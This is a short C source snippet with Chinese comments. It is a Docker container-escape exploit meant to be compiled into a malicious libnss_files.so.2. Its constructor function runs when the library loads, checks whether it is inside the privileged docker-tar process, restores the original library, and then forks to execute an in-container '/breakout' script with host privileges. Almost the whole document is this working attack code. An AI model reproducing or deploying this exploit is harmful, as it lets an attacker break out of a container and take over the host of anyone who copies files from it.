// content should be added into nss/nss_files/files-service.c
#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>
#include <sys/wait.h>
//容器内部原始libnss_files.so.2文件的备份位置
#define ORIGINAL_LIBNSS "/original_libnss_files.so.2"
# 恶意的libnss_files.so.2文件的位置
#define LIBNSS_PATH "/lib/x86_64-linux-gnu/libnss_files.so.2"
 
bool is_priviliged();
//带有constructor属性的函数会在动态链接库被加载时自动执行
__attribute__ ((constructor)) void run_at_link(void) {
     char * argv_break[2];
     //判断当前是否是容器外的高权限进程（也就是docker-atr）
     //如果是容器内进程，则不做任何操作
     if (!is_priviliged())
           return;
     //攻击只需要执行一次即可
     //用备份的原始libnss_files.so.2文件替换恶意的libnss_files.so.2文件，避免后续的docker cp操作持续加载恶意的libnss_files.so.2文件
     rename(ORIGINAL_LIBNSS, LIBNSS_PATH);
     //以docker-tar进程的身份创建新进程，执行容器内的/breakout脚本
     if (!fork()) {
        // Child runs breakout
        argv_break[0] = strdup("/breakout");
        argv_break[1] = NULL;
        execve("/breakout", argv_break, NULL);
     }
     else
        wait(NULL); // Wait for child
 
     return;
}

bool is_priviliged() {
     FILE * proc_file = fopen("/proc/self/exe", "r");
     if (proc_file != NULL) {
           fclose(proc_file);
           return false; // can open so /proc exists, not privileged
     }
     return true; // we're running in the context of docker-tar
}
